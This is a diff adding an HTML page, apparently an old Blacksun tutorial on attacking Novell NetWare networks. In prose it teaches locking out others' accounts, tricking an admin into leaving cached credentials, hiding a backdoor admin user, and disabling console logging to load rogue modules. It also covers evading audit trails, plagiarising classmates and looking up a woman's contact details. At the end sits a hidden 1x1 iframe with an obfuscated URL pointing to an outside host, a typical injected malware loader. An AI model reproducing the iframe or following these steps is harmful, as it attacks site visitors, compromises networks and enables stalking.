@@ -1,0 +1,525 @@
+<html>
+<head>
+<title>netware</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#FFFFFF" text="#000000">
+<b><font size="5"> </font></b>
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr> 
+    <td width="693"> 
+      <pre>
+                        :::::::::   ::::::::  :::::::::  :::::::::: 
+                        :+:    :+: :+:    :+: :+:    :+: :+:        
+                        +:+    +:+ +:+        +:+    +:+ +:+        
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#   
+                        +#+    +#+        +#+ +#+    +#+ +#+        
+                        #+#    #+# #+#    #+# #+#    #+# #+#        
+                        #########   ########  ###    ### ###  
+                         
+              	             <a href="%20http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I     Novell Hacking for      I   Written by:     /
+    >                     I      Complete Newbies       I                  < 
+   /      <a href="mailto:black_mesa@gmx.de">Martin L.</a>       I_____________________________I   <a href="mailto:miggyx@amicoders.demon.co.uk">MiggyX</a>          \
+  /___________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+<table width="28%" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr> 
+    <td width="30%"> 
+    
+    </td>
+  </tr>
+</table>
+<p>Coming together is a beginning, Staying together is progress, Working together 
+  is success!</p>
+<p><b><font size="4">[Contents]</font></b></p>
+<ol>
+  <li><a href="#1">Introduction to Novell Netware</a></li>
+  <li><a href="#2">What is the 'console' and 'NDS'?</a></li>
+  <li><a href="#3">How do I know if they're running Novell?</a></li>
+  <li><a href="#4"> I'm still not sure. I have a normal user account. How can 
+    I check with this?</a></li>
+  <li><a href="#5">What are the usual accounts and passwords and how do I find 
+    a valid account?</a></li>
+  <li><a href="#6">How do I lockout my enemies account?</a></li>
+  <li><a href="#7"> Is there another easy way to get Admin access?</a></li>
+  <li><a href="#8">What about the Net Plug attack?</a></li>
+  <li><a href="#9">What's a backdoor and is it useful to me ?</a></li>
+  <li><a href="#10">Once I'm in, can I leave a back door?</a></li>
+  <li><a href="#11">Leaving an Admin level user in the NDS Tree</a></li>
+  <li><a href="#12">Okay, now how do I leave a backdoor into the server itself?</a></li>
+  <li><a href="#13">Accessing servers drives that you shouldn't be able to see</a></li>
+</ol>
+<p>&nbsp;</p>
+<p><b><font size="4"><a name="1"></a>Introduction to Novell Netware</font></b></p>
+<p> Novell Netware is a server based operating system for networks. Unlike Unix 
+  and NT, Netware isn't an all in one program. Let me explain. Netware itself 
+  runs on top of a version of DOS. The version that you might be familiar with 
+  is MS-DOS as this comes with Windows 95 and 98. Novell uses DR-DOS. This is 
+  very similar to MS-DOS and even uses the same sort of commands. When a Netware 
+  server starts up, first it loads up DR-DOS (also known as Caldera DOS because 
+  Caldera wrote it). Once DOS is started, Netware is loaded which then sets up 
+  the server itself. Once this has been done, the server is happily sitting on 
+  the network and awaiting requests. Netware has two main admin areas. First is 
+  the console and second is NDS.<br>
+  <br>
+  <font size="4"><b><a name="2"></a>What is the 'console' and 'NDS'?</b></font></p>
+<p>The console is kind of like a DOS prompt. It takes commands in the same way 
+  as you'd expect and it looks almost the same to. The prompt though (the bit 
+  before you type in your commands) is somewhat different. In MS-DOS, you might 
+  get a prompt like this:</p>
+<table width="99%" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr>
+    <td><pre>
+C:\WINDOWS >
+|	|
+|	This bit is the directory you are currently in. Here, you can see I'm in the
+|	Windows directory. Netware doesn't have this and I'll explain why a little later
+|
+The 'C:\' shows the current drive. Netware has something like this but it doesn't 
+actually show you what drive you are in. Again, I'll explain this later.</pre></td>
+  </tr>
+</table>
+<p>You've seen what the MS-DOS version is like. Here then is a sample from a Netware 
+  server named &quot;Gandalf&quot;.</p>
+<p><b>GANDALF :</b></p>
+<blockquote>
+  <p> The console is designed simply for managing the server itself. Not the files 
+    or its users as can be done with an NOS (Network Operating System) such as 
+    Linux. Commands entered here affect only the server that is in the prompt. 
+    In this case, only server Gandalf will be affected by my commands.<br>
+    You can run or 'load' programs into the server in the form of NLMs ( Netware 
+    Loadable Modules). These can be seen as plugins for the server. Once run, 
+    the program will automatically be set-up. I'm mentioning this now because 
+    some of the best hacks require software to be loaded in at the server. I'll 
+    cover this later though.<br>
+    The console can also be access from another computer using a piece of software 
+    called &quot;RCONSOLE&quot;. This is a DOS based program so you will need 
+    to be able to run DOS programs on your machine. Many Admins disable this on 
+    user accounts and only have it active on Admin accounts. Even if you can run 
+    RCONSOLE, you will still need a password to access the server. Most servers 
+    are left at the console so no logging in is necessary. However, servers tend 
+    to be well guarded!</p>
+  <p> NDS (Netware Directory Service) is where all the user and file information 
+    is stored. It is usually referred to as the &quot;NDS Tree&quot;. You could 
+    easily compare it to a telephone directory. The NDS Tree holds all the information 
+    about a network. From the individual workstations to the users to the servers 
+    and the files stored on them. Because everything in general is managed through 
+    NDS, this is really the kind of access you want. Console access is useful 
+    (you can kick people you don't like off the server) but having the ability 
+    to alter anything on the network is much more fun. <br>
+    The program that you need to access the NDS Tree is called 'nwadmn32.exe'. 
+    This is usually available somewhere on the system because it isn't directly 
+    a security risk. If you load it as a normal user, you will only have rights 
+    to alter some parts of that user such as the password. You may not be able 
+    to touch other peoples information but you can usually read it. I'll come 
+    back to this later on.</p>
+</blockquote>
+<p><b><font size="4"><a name="3"></a>How do I know if they're running Novell?</font></b></p>
+<p>This is an easy one. Before you can use any machine on a Novell network, you 
+  must login. Novell like to show everyone just how good they think they are and 
+  splash their name and their stupid red 'N' logo everywhere that they feel they 
+  can get away with. This includes the login screen.<br>
+  If for some reason you don't have this on your login screen but you still think 
+  that you are on a Novell network, take a closer look at the login screen. Most 
+  networks now use the latest client which supports contextless logins. Although 
+  this sounds complicated it isn't. Normally when you login to Novell, you must 
+  tell the server what 'context' you are in. This lets people have the same user 
+  names. For instance for me to login to Gandalf I'd need to supply :</p>
+<p>Miggyx.admin.users.abc</p>
+<p><br>
+  This is a short one. Many go much deeper than this and have six levels or more! 
+  Problem is humans aren't too hot at remembering these long login names. For 
+  this reason Novell brought out contextless logins. You pick an option from a 
+  drop down menu then fill in only the user name. For instance :</p>
+<table width="262" border="0" cellspacing="2" cellpadding="2">
+  <tr>
+    <td width="130">Context :</td>
+    <td width="130">Server Admins</td>
+  </tr>
+  <tr>
+    <td width="130">User :</td>
+    <td width="130">miggyx</td>
+  </tr>
+  <tr>
+    <td width="130">Passwd :</td>
+    <td width="130">******</td>
+  </tr>
+</table>
+<p>Instead of :</p>
+<table width="262" border="0" cellspacing="2" cellpadding="2">
+  <tr>
+    <td width="130">User :</td>
+    <td width="130">miggyx.admin.users.abc</td>
+  </tr>
+  <tr>
+    <td width="130">Passwd :</td>
+    <td width="130">******</td>
+  </tr>
+</table>
+<p>Basically it was all done to make users lives easier. This option never appears 
+  on Unix or NT systems because they don't support multiple user names and thus 
+  context is irrelevant. If your system has this on the login screen, you definitely 
+  have Novell Netware.</p>
+<p><b><font size="4"><a name="4"></a>I'm still not sure if I'm on a Novell network. 
+  I have a normal user account. How can I check with this?</font></b></p>
+<p> Yes you can and if you have a real account, it will make your life a lot easier. 
+  It is easier to hack a system that you have some access to than to start from 
+  scratch. Login and see if you have a little red 'N' in the taskbar. This is 
+  Novell's little Admin tool for the user themselves and it has a few interesting 
+  properties too which I'll cover later. If you have this 'N' you are definitely 
+  on a Novell network. However some mean Admins turn off the nice little 'N'.<br>
+  You can also right click on a network drive. A network drive is a directory 
+  on a remote computer that has been made to look like a hard drive on your machine. 
+  You'll find these in 'My Computer'. Right click on them. In this menu, there 
+  will be several entries with the red 'N' next to them. Again this is a dead 
+  give away that you are running on a Novell network.</p>
+<p><b><font size="4"><a name="5"></a>Hmmmm..... I don't have an account. What 
+  are the usual accounts and passwords and how do I find a valid account?</font></b></p>
+<p> Well, there are quite a few standard user names and passwords that are used 
+  on Novell networks. However not all of them are used and sometimes not one is 
+  used. This list comes from the Netware Hack FAQ and I've found it to be quite 
+  comprehensive :<br>
+</p>
+<table width="99%" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr> 
+    <td valign="top"><b>Account </b></td>
+    <td><b> Purpose</b></td>
+  </tr>
+  <tr> 
+    <td valign="top">PRINT </td>
+    <td>Attaching to a second server for printing</td>
+  </tr>
+  <tr> 
+    <td valign="top">LASER </td>
+    <td>Attaching to a second server for printing</td>
+  </tr>
+  <tr> 
+    <td valign="top">HPLASER</td>
+    <td>Attaching to a second server for printing</td>
+  </tr>
+  <tr> 
+    <td valign="top">PRINTER </td>
+    <td>Attaching to a second server for printing</td>
+  </tr>
+  <tr> 
+    <td valign="top">LASERWRITER </td>
+    <td>Attaching to a second server for printing</td>
+  </tr>
+  <tr> 
+    <td valign="top">POST </td>
+    <td>Attaching to a second server for email</td>
+  </tr>
+  <tr> 
+    <td valign="top">MAIL </td>
+    <td>Attaching to a second server for email</td>
+  </tr>
+  <tr> 
+    <td valign="top">GATEWAY </td>
+    <td>Attaching a gateway machine to the server</td>
+  </tr>
+  <tr> 
+    <td valign="top">GATE </td>
+    <td> Attaching a gateway machine to the server</td>
+  </tr>
+  <tr> 
+    <td valign="top">ROUTER </td>
+    <td>Attaching an email router to the server</td>
+  </tr>
+  <tr> 
+    <td valign="top">BACKUP </td>
+    <td>May have password/station restrictions (see below), used for backing up 
+      the server to a tape unit attached to a workstation. For complete backups, 
+      Supervisor equivalence is required.</td>
+  </tr>
+  <tr> 
+    <td valign="top">WANGTEK </td>
+    <td>See BACKUP</td>
+  </tr>
+  <tr> 
+    <td valign="top">FAX </td>
+    <td>Attaching a dedicated fax modem unit to the network</td>
+  </tr>
+  <tr> 
+    <td valign="top">FAXUSER</td>
+    <td>Attaching a dedicated fax modem unit to the network</td>
+  </tr>
+  <tr> 
+    <td valign="top">FAXWORKS </td>
+    <td>Attaching a dedicated fax modem unit to the network</td>
+  </tr>
+  <tr> 
+    <td valign="top">TEST </td>
+    <td>A test user account for temp use</td>
+  </tr>
+  <tr> 
+    <td valign="top">ARCHIVIST</td>
+    <td>Palidrome default account for backup</td>
+  </tr>
+  <tr> 
+    <td valign="top">CHEY_ARCHSVR</td>
+    <td>An account for Arcserve to login to the server from from the console for 
+      tape backup. Version 5.01g's password was WONDERLAND. Delete the Station 
+      Restrictions and use SUPER.EXE to toggle this account and you have an excellent 
+      backdoor.</td>
+  </tr>
+  <tr>
+    <td valign="top">ROOT </td>
+    <td>Found on Shiva LanRovers, gets you the command-line equiv of the AdminGUI. 
+      By default, no password. A lot admins just use the AdminGUI and never set 
+      up a password.</td>
+  </tr>
+</table>
+<p>Some of these are used quite a lot of the time. ROOT is a good example because 
+  it also ties in with superuser access on Unix and Linux servers. Having a user 
+  called root is quite common now. Accounts by the name 'Admin' , 'Administrator' 
+  and 'Manager' are in common use to.</p>
+<p><b>How do I find out if an account is valid?</b></p>
+<p> This is surprisingly easy. Type in the username you are trying to check. Type 
+  in any password unless you know it ( if you know the password then the account 
+  is obviously valid) and press enter. You will likely get an error message back. 
+  If the message says something on the lines of &quot;Invalid password&quot; or 
+  &quot;Unknown Error&quot; followed by a number , it is a fair bet that the account 
+  exists. If you get the Unknown Error message, it is likely that the account 
+  is there but has been locked out. This is also a cunning way of locking out 
+  someone's account who you don't like.</p>
+<p><b><font size="4"><a name="6"></a>How do I lock out my enemies accounts?</font></b></p>
+<p> Well, this is particularly easy to do. Most Admins for security have a limit 
+  on how many times someone can login incorrectly before the account gets locked 
+  out. This is usually set to 5 times. Here's how you do it.<br>
+</p>
+<ol>
+  <li>Type in your friend /enemies login name.</li>
+  <li>Put it an obviously wrong password. Anything will do.</li>
+  <li>Hit 'Enter'.</li>
+  <li>The computer should bounce back with an error about an invalid password. 
+    This is what we want so keep going.</li>
+  <li>Repeat from stage three until the server comes back with an unknown network 
+    error. </li>
+</ol>
+<p>Once you get the unknown network error, you have successfully locked out the 
+  account. It won't work again until an admin manually unlocks it. This could 
+  mean a disabled account for hours or even days. Snik snik!</p>
+<p><b><font size="4"><a name="7"></a>Is there an easy way to get Admin access?</font></b></p>
+<p>This only works on Netware 3.*. You use a program called NW-HACK.exe . A nice 
+  little program that sits and waits till an Admin logs in and then creates a 
+  nice account for you with super user access. You will be able to find this program 
+  on the Internet but I'm not going to spend much time on it because it has a 
+  full set of docs with the program itself.</p>
+<p><b><font size="4"><a name="8"></a>What about the Net Plug attack?</font></b></p>
+<p> This is an attack that I worked out myself before I was given Admin status. 
+  It always works and I've yet to see it fail. Make sure you are at a windows 
+  95 or 98 machine. I doubt NT would be fooled by this trick but I don't have 
+  any NT machines so I can't test it for you.</p>
+<p></p>
+<p>Note : Most Admins, believe that they are the most knowledgeable about their 
+  system. Many also believe that no one else knows much about computers. In other 
+  words, for whatever reasons, they are not too concerned about us i.e. the idiots 
+  attacking their servers. Why? Because we aren't good enough. So why waste valuable 
+  time configuring security that won't be needed eh? I think I've made my point. 
+  They don't see us as a threat. You don't consider a house spider a threat so 
+  you don't go round putting up netting to keep them out. Why? You can't be bothered. 
+  The same rule applies here. Even if you are a computer genius, play it dumb. 
+  Admins like to lecture the uninitiated and would love to appear smarter than 
+  you. This is the way you want it. The Admins will think you're a nice guy or 
+  gal, totally harmless. This sometimes gives you more leverage because they like 
+  you, they'll be willing to help you. They also won't expect you to launch a 
+  huge assault on their servers either However sometimes there are some smart 
+  people out there who will notice your talents and pull you over to their side. 
+  This isn't a bad place to be and can be advantageous later.</p>
+<p></p>
+<p>First of all, login as yourself. Crash your computer and reset it . Walk over 
+  to your favourite admin (the one that hates you most is the best choice ) and 
+  apologise for being an idiot but the computer won't let you login and could 
+  s/he please come and take a look for you. Mumbling and grumbling they'll come 
+  over. The best way to test if it is the machine is for them to login. Of course, 
+  they'll log in as an admin or equivalent. They'll check your account and see 
+  that your account is fine. They'll tell you to log onto another machine and 
+  your account will be okay. They'll now log off and walk off in disgust thinking 
+  you are a computer moron. Not so my friend, we've just done them good and proper!<br>
+  Turn off the computer and pull out the network lead. Turn it back on again. 
+  The computer will detect that you aren't on a network and will dump you at a 
+  desktop with restrictions of the last user. If this user is the admin then chances 
+  are that he or she will have full access to everything including DOS and drive 
+  access. Perfect for installing all those really kewl programs you have on a 
+  disk in your pocket......<br>
+  But you aren't on the network now. That's no fun is it? Shove the lead back 
+  in and try to access a network drive. This is the bit where you hope the Admins 
+  are sloppy or not computer geniuses. Windows by default caches ALL passwords 
+  so unless the Admins have told it not to ( a key deep in the registry) then 
+  windows will have a nice copy of their password. Go into 'My Computer' and click 
+  on a drive. Whoop with glee as Netware logs you in as an Admin. Why does this 
+  happen? Well windows still holds the username and password last used to access 
+  the drive. You are logged into windows as Admin and windows knows what credentials 
+  you last gave to the server. So it supplies them for you. Likewise because you 
+  are now authenticated you know have full access to the NDS tree. Not only can 
+  you read but you can no write, modify delete etc etc. Much more fun!<br>
+  Now, this is the bit where you have to be sneaky. You have to make a new account 
+  for yourself or upgrade your old one. There are pros and cons to each of your 
+  choices. If you alter your existing account and they check it for some reason 
+  ( maybe you got locked out? ) they'll notice you have admin rights and shoot 
+  you. If you make a new user, it might get found quicker but there is no way 
+  to point to you ( it was created by user admin after all tee hee ). The choice 
+  is yours. You can always do both.</p>
+<p><b><font size="4"><a name="9"></a>What's a backdoor and is it useful to me 
+  ?</font></b></p>
+<p>A back door like the name suggests is a way into a system without going through 
+  the front door. The front door being the proper way in. Your backdoor will give 
+  you full access (or whatever it was set-up to do) without anyone else knowing 
+  about it.<br>
+  It is useful to you because it gives you a lot of power and anonymity. People 
+  won't know that it was you that deleted that account or altered your reports. 
+  You'll be like the ghost in the machine. Invisible and all powerful. Doesn't 
+  that sound wonderful to you?</p>
+<p><b><font size="4"><a name="10"></a>Once I'm in, can I leave a back door?</font></b></p>
+<p> Yes, there are many different ways of leaving a back door and may different 
+  things a back door can be designed to do. Firstly, the most powerful backdoor 
+  is the one that gives you full access to an entire system. Unfortunately, these 
+  are the hardest to set-up (unless you did my Net Plug trick) and the Admins 
+  aren't blind. They'll notice that a new admin account has appeared. Unless of 
+  course you hide it. This isn't all that easy but it can be done. The second 
+  type of backdoor gives you access to the server (like rconsole). These aren't 
+  as powerful but they still have the ability to run things like the 'down' command. 
+  The 'Down' command shuts the server down and dumps it at a DOS prompt. Another 
+  powerful command is the load command. This sticks programs into memory. Unfortunately 
+  all but the most stupid Admins log the console.</p>
+<p><b><font size="4"><a name="11"></a>Leaving an Admin level user in the NDS Tree</font></b></p>
+<p>This is the best way of hiding a user in the NDS Tree. Most Admins have only 
+  been on the CNA (Certified Novell Administrator) course so won't have the expertise 
+  to locate the user even if they did think that it existed. Even if they have 
+  a CNE (Certified Novell Engineer) they aren't likely to find your user because 
+  not only don't they know where to look, they won't know your user is there. 
+  The best crimes aren't ones that you can get away with without being caught. 
+  The best crimes are ones that the victim doesn't even know have happened.<br>
+  Anyway, here is what you have to do :</p>
+<ul>
+  <li>Get logged in as Admin or equivalent ( Use the Net Plug trick )</li>
+  <li>In NWADMIN highlight an existing container.</li>
+  <li>Create a new container inside this container.</li>
+  <li>Create a user inside this new container. No home directory.</li>
+  <li>Give this user full Trustee Rights to their own user object.</li>
+  <li>Give this user full Trustee Rights to the new container.</li>
+  <li>Make this user security equivalent to Admin.</li>
+  <li>Modify the ACL for the new user so they can't be seen.</li>
+  <li>Adjust the Inherit Rights Filter on the new container so no one can see 
+    it.</li>
+</ul>
+<p>I've not had the chance to really test this in the field. It worked for me 
+  but whether or not it won't be detected in the field is another matter. It works 
+  fine in theory though.</p>
+<p><b><font size="4"><a name="12"></a>Okay, now how do I leave a backdoor into 
+  the server itself?</font></b></p>
+<p> This is a lot more difficult because you have to run a program on the server 
+  itself. You do this by using the load command. It will automatically load the 
+  program from the SYS: directory. You'd have to copy the files to this directory 
+  first. Because this dir is filled with NLMs, it will be a lot harder to locate 
+  your new program as a rogue. Problem is actually running it. As I said before 
+  most Admins run the console logging program called CONLOG. So now what? If we 
+  try anything it will be logged won't it? Sure, unless we turn off the logging 
+  program first tee hee. Type &quot;unload conlog&quot; without the quotes. This 
+  will stop logging console activity. Next type &quot;load magicfile.nlm&quot; 
+  with the name of your program and without the quotes. Next type &quot;load conlog&quot; 
+  again without the quotes. Loading up conlog is the last thing that you do before 
+  leaving the server.<br>
+  Some Admins run a program called &quot;Secure Console&quot;. This stops you 
+  from loading any more programs. The only way to get round this is to use the 
+  unload command again. However it is password protected. You can get past this 
+  too but it will take some guts to do and it will take out the server for a few 
+  minutes. Are you ready?</p>
+<ol>
+  <li>Type &quot;Down&quot; at the prompt. If there are any users logged in, it 
+    will warn you. Press Y to continue or N to cancel. Pressing Y will cut them 
+    off. Any system that is on the Novell network will report to its users that 
+    the server is going down. Try to do this at the end of the day when all the 
+    clients are turned off or when you've got a chance to reset them before someone 
+    sees the message</li>
+  <li>Turn the machine off</li>
+  <li>Wait a few seconds</li>
+  <li>Then turn it on again</li>
+  <li>Run outside and wait for the server to come back up. It is not a good idea 
+    to get caught with the server in this state.</li>
+  <li>When the Admins rush in to find out why their precious server bit the dust, 
+    their last concern is whether secure console is running or not.</li>
+  <li>When they leave, wait a few minutes before going back in.</li>
+  <li>Go to the console and turn off the console logger</li>
+  <li>Run your nasty little program</li>
+  <li>Turn the logging program back on</li>
+  <li>Walk out of the room as a super user.</li>
+</ol>
+<p>The program itself will not show up in the logs ( because you stopped logging 
+  before you ran it ). When they shut the server down, the program will not longer 
+  be resident. However, if you are taking the risk to run this program, make sure 
+  you also run something that will catch the rconsole password. Admins hardly 
+  EVER change this. They are far more careful with the NDS password and see no 
+  reason why anyone would be able to find or to use their little rconsole password. 
+  Once you have the rconsole password you don't really need a backdoor.</p>
+<p><b><font size="4"><a name="13"></a>Accessing servers drives that you shouldn't 
+  be able to see</font></b></p>
+<p>When you are using Novell, you have your home area mapped as a network drive. 
+  You can't press 'Up' to go higher because it will just take you to my computer. 
+  How do you get around this and why would you want to?<br>
+  Well, most Admins don't login to everyone's user account to check that they 
+  are set-up correctly ( I know I wouldn't bother going through 1000 different 
+  accounts in the unlikely case that one of them is messed up). If they aren't 
+  set-up correctly, you might have access to other peoples home areas. Thing is 
+  though, how do you get there? You can't see higher than your own directory.<br>
+  First of all, you have to find out what server you are connected to. This is 
+  pretty straight forward. Okay, go back to 'My Computer'. Right click on a network 
+  drive and hit properties. It will tell you what server it is mapped on. I'll 
+  use GANDALF as an example. My home directory is mapped to F:, however the real 
+  location of my home directory is \\gandalf\data1\users\yr12_990\miggyx\ . Now, 
+  I wouldn't have known that if I hadn't checked the properties. Admins usually 
+  assume you won't know or won't bother looking. The server name directly follows 
+  the '\\'. Go to the start menu and select run. Type in the server name. In my 
+  example this would be \\gandalf. <br>
+  What if those pesky Admins have removed the Run command? Not a problem. Minimise 
+  all the windows so you are looking at your desktop. Right click and select New 
+  -&gt; Shortcut. When asked what it should shortcut to, type in '\\servername'. 
+  Press 'Enter' a few times. You should get an icon on your desktop. Click this 
+  twice and it will pull up the server. Simple but effective. A word of caution 
+  though. Delete the shortcut after use using shift+del. NEVER use just the delete 
+  option. If you choose just to delete the file, it will go straight to the recycle 
+  bin. Sometimes users don't have access to it and so can't remove the file themselves. 
+  This is when those friendly Admins come along and see a nice shortcut to their 
+  server with your name on it. Not a good thing to be doing. Shift + Del removes 
+  the file directly. This also bypasses any logging software running on the machine 
+  itself. The Admins won't be able to get to the file assuming they know it exists 
+  in the first place. Best to play it safe. <br>
+  Once you have access to the server itself ( albeit only as yourself and not 
+  as an admin unless your admin is really stupid), you might be able to browse 
+  around. For instance, I still had read access to everything in the \\gandalf\data1\users\yr12_990 
+  directory. I could go in a read everyone's work ( although I couldn't write 
+  to it) and pass it off as my own. Also, you'll be able to access some of the 
+  system directories. In here you'll find useful tools such as rconsole, fconsole 
+  nwadmn32.exe and others. Running nwadmn32.exe as yourself only gives you your 
+  own rights to the NDS tree. The NDS tree ( Netware directory Service ) contains 
+  everything on the entire network. Even if you've got very limited access, you 
+  will still see the whole tree. This includes the usernames for the Admins and 
+  all the services they are running. You may even have some ability to alter users 
+  in your group. It all depends on how your system is configured. Either way it 
+  can be a powerful information tool. Usually you can see everything but alter 
+  nothing. This is still useful. For instance, say there is this gal you really 
+  like and you would kill for her phone number and address. Why go through all 
+  the hassle? Most Admins stick all information about a user into their network. 
+  It makes sense really. Load up nwadmn32.exe ( they can't restrict this because 
+  it would restrict all windows programs and that would be really stupid) find 
+  her username and click twice. Bang, you can see all her details. Sure you can't 
+  actually alter them but you can read can't you?<br>
+  You should also be able to happily browse through the directories that you can 
+  see. Even if you aren't logged in as an Admin, it is likely you can find some 
+  fun files to play around with. If they need DOS access, you'd better log in 
+  as an Admin. If you've read the above, you should be able to get Admin status. 
+  <br>
+  I hope you have learnt something useful from this tutorial. It is only meant 
+  as a starter guide for newbies and not as an in-depth Novell hacking tutorial. 
+  Good luck with your efforts and if you have any comments, please <a href="mailto:miggyx@amicoders.demon.co.uk">e-mail</a> 
+  me and I'll do my best to get back to you. Thanks!</p>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
